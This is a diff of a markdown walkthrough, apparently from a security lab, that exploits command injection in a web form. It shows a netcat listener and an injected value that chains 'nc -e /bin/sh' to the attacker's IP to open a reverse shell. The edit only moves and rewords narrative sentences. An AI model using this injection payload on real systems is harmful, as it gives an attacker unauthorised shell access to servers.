@@ -119,7 +119,7 @@ Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 > nc -lvp 1234
 > ```
 > 
-> Crafting a malicious command, I entered:
+> After setting up the listener, I submitted the form with the injected command and awaited the connection on my local machine.
 > 
 > ```
 > 127.0.0.1 & nc -e /bin/sh 192.168.117.124 1234
@@ -127,7 +127,7 @@ Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 > 
 > This command instructed the server to establish a reverse shell connection to my local machine on port 1234.
 > 
-> After setting up the listener, I submitted the form with the injected command and awaited the connection on my local machine.
+> 
 > 
 > Upon successful exploitation of the vulnerability, I gained a reverse shell connection to the server.
 > 
